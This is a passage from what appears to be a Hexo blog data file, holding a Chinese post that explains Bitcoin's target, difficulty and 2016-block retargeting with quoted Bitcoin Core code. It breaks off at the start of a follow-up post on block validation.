难度调整\n上面提到，比特币的挖矿难度是可调整的，那么这个难度为什么需要调整？由谁来调整？如何调整？\n\n比特币系统平均每10分钟生成一个区块，而全网的算力是变化的，为了应对全网算力可能在一定时间内发生暴增或者骤减的情况，保持每10分钟产生一个新区块的产生速率，比特币采用这样一种难度调整机制:每2016个区块，所有节点调整一次难度，难度的调整公式可表示如下：\n``` bash\nNew Difficulty = Old Difficulty * (Actual Time of Last 2016 Blocks / 20160 minutes)\n```\n通过上述公式，比特币系统便能实现当区块产生速率比10分钟要快时，增加难度。如果发现比10分钟慢时，则降低难度。当然这种调整无法及时应对币价暴跌导致全网算力骤减的情况。\n\n在矿工每次打包新的区块的时候，会对下一个区块的高度进行判断\n1、当高度不是2016的倍数时，会直接返回上一个区块的bit\n2、当高度是2016的倍数时，会根据上面提到的难度调整公式进行计算。\n具体代码实现如下：\n```\nunsigned int CalculateNextWorkRequired(const CBlockIndex* pindexLast, int64_t nFirstBlockTime, const Consensus::Params& params)\n{\n    if (params.fPowNoRetargeting)\n         return pindexLast->nBits;\n         \n    // Limit adjustment step\n    int64_t nActualTimespan = pindexLast->GetBlockTime() - nFirstBlockTime;\n    if (nActualTimespan < params.nPowTargetTimespan/4)\n        nActualTimespan = params.nPowTargetTimespan/4;\n    if (nActualTimespan > params.nPowTargetTimespan*4)\n        nActualTimespan = params.nPowTargetTimespan*4;\n        \n    // Retarget\n    const arith_uint256 bnPowLimit = UintToArith256(params.powLimit);\n    arith_uint256 bnNew;\n    bnNew.SetCompact(pindexLast->nBits);\n    bnNew *= nActualTimespan;\n    bnNew /= params.nPowTargetTimespan;\n  \n    if (bnNew > bnPowLimit)\n        bnNew = bnPowLimit;\n                                                                                    \n    return bnNew.GetCompact();\n                                                                                    }\n}\n```\n为了防止难度的变化过快，每隔周期的调整幅度必须有一定的限制。如果调整幅度大于4倍，则按4倍调整，因此当难度变化过快时，可能要经过几个2016区块周期才会完成。\n\n","source":"_posts/比特币挖矿之全网难度.md","raw":"---\ntitle: 比特币挖矿之全网难度\ncomments: false\ndate: 2018-02-09 12:24:39\ncategories: 矿池\ntags: \n- LeonBCK \n- bitcoin \n- 比特币\nimg:\n---\n\n2018年2月7日，比特币全网难度再次提升10.43%，而这对于正经历币价大跌的矿工来说，挖矿难度的提升，意味着挖矿收益进一步下降。那么在比特币系统中，挖矿难度究竟是如何调整的呢？\n\n### 目标值（target）\n上文中提到，矿工在打包区块的时候，合格的区块应该满足:\n``` bash\nSHA256(SHA256(BlockHeader))<target\n```\n在比特币系统中，target是使用区块头中的nBits字段来标识的。nBits使用压缩表示机制来存储当前目标值，其中nBits的前两位十六进制数字为幂(bits_exponent),后六位为系数(bits_coefficient)，nBits可以通过如下运算，得到target。\n``` bash\ntarget = bits_coefficient * 2^(8 * (bits_exponent-3))\n```\n以508230区块为例，此区块对应的bits为0x1761e9f8\n``` bash\ntarget = 0x61e9f8 *2^(0x08*(0x17-3))\n               = 0x61e9f8 *2^(0x08*0x14)\n               = 0x61e9f8 *2^0xA0\n```\n按十进制计算为:\n``` bash\ntarget = 6,416,888 * 2^160\n```\n转换为十六进制后为:\n``` bash\ntarget =0x00000000000000000061e9f80000000000000000000000000000000000000000\n```\n而记录到区块链上的该高度对应的区块头的hash值为0000000000000000003692a92ed937e4e0a5f247e27feeeb4df383e6d9c2bd94,满足要求。\n\n### 难度（difficulty）\n难度（difficulty）是对挖矿困难程度的度量，创世区块的difficulty为1。需要注意的是，difficulty并没有记录在区块头中，而是通过nBits计算得到的。具体实现如下：\n```\ndouble GetDifficulty(const CBlockIndex* blockindex)\n{\n    if (blockindex == NULL)\n    {\n        if (chainActive.Tip() == NULL)\n            return 1.0;\n        else\n            blockindex = chainActive.Tip();\n    }\n    \n    int nShift = (blockindex->nBits >> 24) & 0xff;\n    \n    double dDiff = (double)0x0000ffff / (double)(blockindex->nBits &0x00ffffff);\n    \n    while (nShift < 29)\n    {\n        dDiff *= 256.0;\n        nShift++;\n    }\n    \n    while (nShift > 29)\n    {\n        dDiff /= 256.0;\n        nShift--;\n    }\n\n    return dDiff;\n}\n```\n创世区块的bits值为0x1d00ffff，代入上述方法中，nShift=29,dDiff=1,可得创世区块的difficulty为1。\n根据上面目标值target的计算公式可得创世区块的target为:0x00000000ffff0000000000000000000000000000000000000000000000000000。根据难度调整机制（参见下文），我们可以知道，高度为1的区块的target也为0x00000000ffff0000000000000000000000000000000000000000000000000000，也就是说，为了构建出高度为1的合法区块，矿工需要不断对区块头做双SHA256运算，直到找到一个区块头的Hash值的前32位均为0，而SHA256运算结果在某一位上的值可以认为是随机的，也就是平均要做2^32次运算，才能找到问题的解。上述GetDifficulty方法表现的nBits与Difficulty的关系可转化为target与Difficulty:\n```\ndifficulty = difficulty_1_target/current_target\n```\n其中difficulty表示最新区块的挖矿难度，difficulty_1_target表示难度为1的区块的目标值，也可以理解为创世区块的目标值，current_target表示最新区块的目标值。\n从上述公式我们可以看出，难度与目标值成反比关系，目标值越小，难度越大，矿工平均需要运算的次数也就越大。\n同样以508230区块为例:\n```\ndifficulty = 0x00000000FFFF0000000000000000000000000000000000000000000000000000 /\n             0x00000000000000000061e9f80000000000000000000000000000000000000000\n           = 2.87 * 10^12\n           = 2.87 T\n```\n\n### 难度调整\n上面提到，比特币的挖矿难度是可调整的，那么这个难度为什么需要调整？由谁来调整？如何调整？\n\n比特币系统平均每10分钟生成一个区块，而全网的算力是变化的，为了应对全网算力可能在一定时间内发生暴增或者骤减的情况，保持每10分钟产生一个新区块的产生速率，比特币采用这样一种难度调整机制:每2016个区块，所有节点调整一次难度，难度的调整公式可表示如下：\n``` bash\nNew Difficulty = Old Difficulty * (Actual Time of Last 2016 Blocks / 20160 minutes)\n```\n通过上述公式，比特币系统便能实现当区块产生速率比10分钟要快时，增加难度。如果发现比10分钟慢时，则降低难度。当然这种调整无法及时应对币价暴跌导致全网算力骤减的情况。\n\n在矿工每次打包新的区块的时候，会对下一个区块的高度进行判断\n1、当高度不是2016的倍数时，会直接返回上一个区块的bit\n2、当高度是2016的倍数时，会根据上面提到的难度调整公式进行计算。\n具体代码实现如下：\n```\nunsigned int CalculateNextWorkRequired(const CBlockIndex* pindexLast, int64_t nFirstBlockTime, const Consensus::Params& params)\n{\n    if (params.fPowNoRetargeting)\n         return pindexLast->nBits;\n         \n    // Limit adjustment step\n    int64_t nActualTimespan = pindexLast->GetBlockTime() - nFirstBlockTime;\n    if (nActualTimespan < params.nPowTargetTimespan/4)\n        nActualTimespan = params.nPowTargetTimespan/4;\n    if (nActualTimespan > params.nPowTargetTimespan*4)\n        nActualTimespan = params.nPowTargetTimespan*4;\n        \n    // Retarget\n    const arith_uint256 bnPowLimit = UintToArith256(params.powLimit);\n    arith_uint256 bnNew;\n    bnNew.SetCompact(pindexLast->nBits);\n    bnNew *= nActualTimespan;\n    bnNew /= params.nPowTargetTimespan;\n  \n    if (bnNew > bnPowLimit)\n        bnNew = bnPowLimit;\n                                                                                    \n    return bnNew.GetCompact();\n                                                                                    }\n}\n```\n为了防止难度的变化过快，每隔周期的调整幅度必须有一定的限制。如果调整幅度大于4倍，则按4倍调整，因此当难度变化过快时，可能要经过几个2016区块周期才会完成。\n\n","slug":"比特币挖矿之全网难度","published":1,"updated":"2018-03-09T09:32:59.585Z","layout":"post","photos":[],"link":"","_id":"cjf7piaw5001upkwoowhrv02x","content":"<p>2018年2月7日，比特币全网难度再次提升10.43%，而这对于正经历币价大跌的矿工来说，挖矿难度的提升，意味着挖矿收益进一步下降。那么在比特币系统中，挖矿难度究竟是如何调整的呢？</p>\n<h3 id=\"目标值（target）\"><a href=\"#目标值（target）\" class=\"headerlink\" title=\"目标值（target）\"></a>目标值（target）</h3><p>上文中提到，矿工在打包区块的时候，合格的区块应该满足:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SHA256(SHA256(BlockHeader))&lt;target</span><br></pre></td></tr></table></figure></p>\n<p>在比特币系统中，target是使用区块头中的nBits字段来标识的。nBits使用压缩表示机制来存储当前目标值，其中nBits的前两位十六进制数字为幂(bits_exponent),后六位为系数(bits_coefficient)，nBits可以通过如下运算，得到target。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target = bits_coefficient * 2^(8 * (bits_exponent-3))</span><br></pre></td></tr></table></figure></p>\n<p>以508230区块为例，此区块对应的bits为0x1761e9f8<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target = 0x61e9f8 *2^(0x08*(0x17-3))</span><br><span class=\"line\">               = 0x61e9f8 *2^(0x08*0x14)</span><br><span class=\"line\">               = 0x61e9f8 *2^0xA0</span><br></pre></td></tr></table></figure></p>\n<p>按十进制计算为:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target = 6,416,888 * 2^160</span><br></pre></td></tr></table></figure></p>\n<p>转换为十六进制后为:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target =0x00000000000000000061e9f80000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure></p>\n<p>而记录到区块链上的该高度对应的区块头的hash值为0000000000000000003692a92ed937e4e0a5f247e27feeeb4df383e6d9c2bd94,满足要求。</p>\n<h3 id=\"难度（difficulty）\"><a href=\"#难度（difficulty）\" class=\"headerlink\" title=\"难度（difficulty）\"></a>难度（difficulty）</h3><p>难度（difficulty）是对挖矿困难程度的度量，创世区块的difficulty为1。需要注意的是，difficulty并没有记录在区块头中，而是通过nBits计算得到的。具体实现如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">double GetDifficulty(const CBlockIndex* blockindex)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (blockindex == NULL)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (chainActive.Tip() == NULL)</span><br><span class=\"line\">            return 1.0;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            blockindex = chainActive.Tip();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    int nShift = (blockindex-&gt;nBits &gt;&gt; 24) &amp; 0xff;</span><br><span class=\"line\">    </span><br><span class=\"line\">    double dDiff = (double)0x0000ffff / (double)(blockindex-&gt;nBits &amp;0x00ffffff);</span><br><span class=\"line\">    </span><br><span class=\"line\">    while (nShift &lt; 29)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        dDiff *= 256.0;</span><br><span class=\"line\">        nShift++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    while (nShift &gt; 29)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        dDiff /= 256.0;</span><br><span class=\"line\">        nShift--;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return dDiff;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>创世区块的bits值为0x1d00ffff，代入上述方法中，nShift=29,dDiff=1,可得创世区块的difficulty为1。<br>根据上面目标值target的计算公式可得创世区块的target为:0x00000000ffff0000000000000000000000000000000000000000000000000000。根据难度调整机制（参见下文），我们可以知道，高度为1的区块的target也为0x00000000ffff0000000000000000000000000000000000000000000000000000，也就是说，为了构建出高度为1的合法区块，矿工需要不断对区块头做双SHA256运算，直到找到一个区块头的Hash值的前32位均为0，而SHA256运算结果在某一位上的值可以认为是随机的，也就是平均要做2^32次运算，才能找到问题的解。上述GetDifficulty方法表现的nBits与Difficulty的关系可转化为target与Difficulty:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">difficulty = difficulty_1_target/current_target</span><br></pre></td></tr></table></figure></p>\n<p>其中difficulty表示最新区块的挖矿难度，difficulty_1_target表示难度为1的区块的目标值，也可以理解为创世区块的目标值，current_target表示最新区块的目标值。<br>从上述公式我们可以看出，难度与目标值成反比关系，目标值越小，难度越大，矿工平均需要运算的次数也就越大。<br>同样以508230区块为例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">difficulty = 0x00000000FFFF0000000000000000000000000000000000000000000000000000 /</span><br><span class=\"line\">             0x00000000000000000061e9f80000000000000000000000000000000000000000</span><br><span class=\"line\">           = 2.87 * 10^12</span><br><span class=\"line\">           = 2.87 T</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"难度调整\"><a href=\"#难度调整\" class=\"headerlink\" title=\"难度调整\"></a>难度调整</h3><p>上面提到，比特币的挖矿难度是可调整的，那么这个难度为什么需要调整？由谁来调整？如何调整？</p>\n<p>比特币系统平均每10分钟生成一个区块，而全网的算力是变化的，为了应对全网算力可能在一定时间内发生暴增或者骤减的情况，保持每10分钟产生一个新区块的产生速率，比特币采用这样一种难度调整机制:每2016个区块，所有节点调整一次难度，难度的调整公式可表示如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">New Difficulty = Old Difficulty * (Actual Time of Last 2016 Blocks / 20160 minutes)</span><br></pre></td></tr></table></figure></p>\n<p>通过上述公式，比特币系统便能实现当区块产生速率比10分钟要快时，增加难度。如果发现比10分钟慢时，则降低难度。当然这种调整无法及时应对币价暴跌导致全网算力骤减的情况。</p>\n<p>在矿工每次打包新的区块的时候，会对下一个区块的高度进行判断<br>1、当高度不是2016的倍数时，会直接返回上一个区块的bit<br>2、当高度是2016的倍数时，会根据上面提到的难度调整公式进行计算。<br>具体代码实现如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsigned int CalculateNextWorkRequired(const CBlockIndex* pindexLast, int64_t nFirstBlockTime, const Consensus::Params&amp; params)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (params.fPowNoRetargeting)</span><br><span class=\"line\">         return pindexLast-&gt;nBits;</span><br><span class=\"line\">         </span><br><span class=\"line\">    // Limit adjustment step</span><br><span class=\"line\">    int64_t nActualTimespan = pindexLast-&gt;GetBlockTime() - nFirstBlockTime;</span><br><span class=\"line\">    if (nActualTimespan &lt; params.nPowTargetTimespan/4)</span><br><span class=\"line\">        nActualTimespan = params.nPowTargetTimespan/4;</span><br><span class=\"line\">    if (nActualTimespan &gt; params.nPowTargetTimespan*4)</span><br><span class=\"line\">        nActualTimespan = params.nPowTargetTimespan*4;</span><br><span class=\"line\">        </span><br><span class=\"line\">    // Retarget</span><br><span class=\"line\">    const arith_uint256 bnPowLimit = UintToArith256(params.powLimit);</span><br><span class=\"line\">    arith_uint256 bnNew;</span><br><span class=\"line\">    bnNew.SetCompact(pindexLast-&gt;nBits);</span><br><span class=\"line\">    bnNew *= nActualTimespan;</span><br><span class=\"line\">    bnNew /= params.nPowTargetTimespan;</span><br><span class=\"line\">  </span><br><span class=\"line\">    if (bnNew &gt; bnPowLimit)</span><br><span class=\"line\">        bnNew = bnPowLimit;</span><br><span class=\"line\">                                                                                    </span><br><span class=\"line\">    return bnNew.GetCompact();</span><br><span class=\"line\">                                                                                    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>为了防止难度的变化过快，每隔周期的调整幅度必须有一定的限制。如果调整幅度大于4倍，则按4倍调整，因此当难度变化过快时，可能要经过几个2016区块周期才会完成。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>2018年2月7日，比特币全网难度再次提升10.43%，而这对于正经历币价大跌的矿工来说，挖矿难度的提升，意味着挖矿收益进一步下降。那么在比特币系统中，挖矿难度究竟是如何调整的呢？</p>\n<h3 id=\"目标值（target）\"><a href=\"#目标值（target）\" class=\"headerlink\" title=\"目标值（target）\"></a>目标值（target）</h3><p>上文中提到，矿工在打包区块的时候，合格的区块应该满足:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SHA256(SHA256(BlockHeader))&lt;target</span><br></pre></td></tr></table></figure></p>\n<p>在比特币系统中，target是使用区块头中的nBits字段来标识的。nBits使用压缩表示机制来存储当前目标值，其中nBits的前两位十六进制数字为幂(bits_exponent),后六位为系数(bits_coefficient)，nBits可以通过如下运算，得到target。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target = bits_coefficient * 2^(8 * (bits_exponent-3))</span><br></pre></td></tr></table></figure></p>\n<p>以508230区块为例，此区块对应的bits为0x1761e9f8<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target = 0x61e9f8 *2^(0x08*(0x17-3))</span><br><span class=\"line\">               = 0x61e9f8 *2^(0x08*0x14)</span><br><span class=\"line\">               = 0x61e9f8 *2^0xA0</span><br></pre></td></tr></table></figure></p>\n<p>按十进制计算为:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target = 6,416,888 * 2^160</span><br></pre></td></tr></table></figure></p>\n<p>转换为十六进制后为:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target =0x00000000000000000061e9f80000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure></p>\n<p>而记录到区块链上的该高度对应的区块头的hash值为0000000000000000003692a92ed937e4e0a5f247e27feeeb4df383e6d9c2bd94,满足要求。</p>\n<h3 id=\"难度（difficulty）\"><a href=\"#难度（difficulty）\" class=\"headerlink\" title=\"难度（difficulty）\"></a>难度（difficulty）</h3><p>难度（difficulty）是对挖矿困难程度的度量，创世区块的difficulty为1。需要注意的是，difficulty并没有记录在区块头中，而是通过nBits计算得到的。具体实现如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">double GetDifficulty(const CBlockIndex* blockindex)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (blockindex == NULL)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (chainActive.Tip() == NULL)</span><br><span class=\"line\">            return 1.0;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            blockindex = chainActive.Tip();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    int nShift = (blockindex-&gt;nBits &gt;&gt; 24) &amp; 0xff;</span><br><span class=\"line\">    </span><br><span class=\"line\">    double dDiff = (double)0x0000ffff / (double)(blockindex-&gt;nBits &amp;0x00ffffff);</span><br><span class=\"line\">    </span><br><span class=\"line\">    while (nShift &lt; 29)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        dDiff *= 256.0;</span><br><span class=\"line\">        nShift++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    while (nShift &gt; 29)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        dDiff /= 256.0;</span><br><span class=\"line\">        nShift--;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return dDiff;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>创世区块的bits值为0x1d00ffff，代入上述方法中，nShift=29,dDiff=1,可得创世区块的difficulty为1。<br>根据上面目标值target的计算公式可得创世区块的target为:0x00000000ffff0000000000000000000000000000000000000000000000000000。根据难度调整机制（参见下文），我们可以知道，高度为1的区块的target也为0x00000000ffff0000000000000000000000000000000000000000000000000000，也就是说，为了构建出高度为1的合法区块，矿工需要不断对区块头做双SHA256运算，直到找到一个区块头的Hash值的前32位均为0，而SHA256运算结果在某一位上的值可以认为是随机的，也就是平均要做2^32次运算，才能找到问题的解。上述GetDifficulty方法表现的nBits与Difficulty的关系可转化为target与Difficulty:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">difficulty = difficulty_1_target/current_target</span><br></pre></td></tr></table></figure></p>\n<p>其中difficulty表示最新区块的挖矿难度，difficulty_1_target表示难度为1的区块的目标值，也可以理解为创世区块的目标值，current_target表示最新区块的目标值。<br>从上述公式我们可以看出，难度与目标值成反比关系，目标值越小，难度越大，矿工平均需要运算的次数也就越大。<br>同样以508230区块为例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">difficulty = 0x00000000FFFF0000000000000000000000000000000000000000000000000000 /</span><br><span class=\"line\">             0x00000000000000000061e9f80000000000000000000000000000000000000000</span><br><span class=\"line\">           = 2.87 * 10^12</span><br><span class=\"line\">           = 2.87 T</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"难度调整\"><a href=\"#难度调整\" class=\"headerlink\" title=\"难度调整\"></a>难度调整</h3><p>上面提到，比特币的挖矿难度是可调整的，那么这个难度为什么需要调整？由谁来调整？如何调整？</p>\n<p>比特币系统平均每10分钟生成一个区块，而全网的算力是变化的，为了应对全网算力可能在一定时间内发生暴增或者骤减的情况，保持每10分钟产生一个新区块的产生速率，比特币采用这样一种难度调整机制:每2016个区块，所有节点调整一次难度，难度的调整公式可表示如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">New Difficulty = Old Difficulty * (Actual Time of Last 2016 Blocks / 20160 minutes)</span><br></pre></td></tr></table></figure></p>\n<p>通过上述公式，比特币系统便能实现当区块产生速率比10分钟要快时，增加难度。如果发现比10分钟慢时，则降低难度。当然这种调整无法及时应对币价暴跌导致全网算力骤减的情况。</p>\n<p>在矿工每次打包新的区块的时候，会对下一个区块的高度进行判断<br>1、当高度不是2016的倍数时，会直接返回上一个区块的bit<br>2、当高度是2016的倍数时，会根据上面提到的难度调整公式进行计算。<br>具体代码实现如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsigned int CalculateNextWorkRequired(const CBlockIndex* pindexLast, int64_t nFirstBlockTime, const Consensus::Params&amp; params)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (params.fPowNoRetargeting)</span><br><span class=\"line\">         return pindexLast-&gt;nBits;</span><br><span class=\"line\">         </span><br><span class=\"line\">    // Limit adjustment step</span><br><span class=\"line\">    int64_t nActualTimespan = pindexLast-&gt;GetBlockTime() - nFirstBlockTime;</span><br><span class=\"line\">    if (nActualTimespan &lt; params.nPowTargetTimespan/4)</span><br><span class=\"line\">        nActualTimespan = params.nPowTargetTimespan/4;</span><br><span class=\"line\">    if (nActualTimespan &gt; params.nPowTargetTimespan*4)</span><br><span class=\"line\">        nActualTimespan = params.nPowTargetTimespan*4;</span><br><span class=\"line\">        </span><br><span class=\"line\">    // Retarget</span><br><span class=\"line\">    const arith_uint256 bnPowLimit = UintToArith256(params.powLimit);</span><br><span class=\"line\">    arith_uint256 bnNew;</span><br><span class=\"line\">    bnNew.SetCompact(pindexLast-&gt;nBits);</span><br><span class=\"line\">    bnNew *= nActualTimespan;</span><br><span class=\"line\">    bnNew /= params.nPowTargetTimespan;</span><br><span class=\"line\">  </span><br><span class=\"line\">    if (bnNew &gt; bnPowLimit)</span><br><span class=\"line\">        bnNew = bnPowLimit;</span><br><span class=\"line\">                                                                                    </span><br><span class=\"line\">    return bnNew.GetCompact();</span><br><span class=\"line\">                                                                                    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>为了防止难度的变化过快，每隔周期的调整幅度必须有一定的限制。如果调整幅度大于4倍，则按4倍调整，因此当难度变化过快时，可能要经过几个2016区块周期才会完成。</p>\n"},{"title":"比特币挖矿之区块校验","comments":0,"date":"2018-03-09T03:15:45.000Z","img":null,"_content":"在[比特币挖矿之矿工任务](http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/)中我们提到，矿工的首要任务是同步区块链已有数据，监听新区块。当新的区块在网络中传播时，每一个全节点在将它转发到其他节点之前，会进行一系列的测试去验证区块的合法性。下面我们将对校验标准进行具体介绍。\n\n## 区块校验\n比特币区块的校验标准如下：\n1、区块头的的哈希值满足当前目标值（工作量证明）\n2、重构Merkle树得到的树根与区块头中hashMerkleRoot值一致（验证MerkleRoot是否由区块中交易得到）\n3、区块大小在长度限制内\n4、第一个交易是coinbase交易,且其他交易都不是coinbase交易\n5、遍历区块内所有交易，[检查交易](http://c60block.com/2018/03/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E4%BA%A4%E6%98%93%E6%A0%A1%E9%AA%8C/)合法性\n\n以上的校验标准主要在比特币核心客户端的[CheckBlock](https://github.com/bitcoin/bitcoin/blob/3fa24bb217b207d964acd4db4cb5df085a7d3ce5/src/validation.cpp#L3008)函数中获得，具体源码如下：\n```\nbool CheckBlock(const CBlock& block, CValidationState& state, const Consensus::Params& consensusParams, bool fCheckPOW, bool fCheckMerkleRoot)\n{\n    // These are checks that are independent of context.\n    \n    // 如果区块已经检查过，则直接返回结果true\n    if (block.fChecked)\n        return true;\n    \n    // 检查区块头是否满足工作量要求 \n    if (!CheckBlockHeader(block, state, consensusParams, fCheckPOW))\n        return false;\n\n    // 判断是否校验MerkleRoot 若检查，则校验MerkleRoot是否符合要求，是否存在重复交易\n    if (fCheckMerkleRoot) {\n        bool mutated;\n        // 重新构建一遍Merkle树，返回MerkleRoot\n        uint256 hashMerkleRoot2 = BlockMerkleRoot(block, &mutated);\n        if (block.hashMerkleRoot != hashMerkleRoot2)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-txnmrklroot\",true, \"hashMerkleRoot mismatch\");\n\n        // Check for merkle tree malleability (CVE-2012-2459): repeating 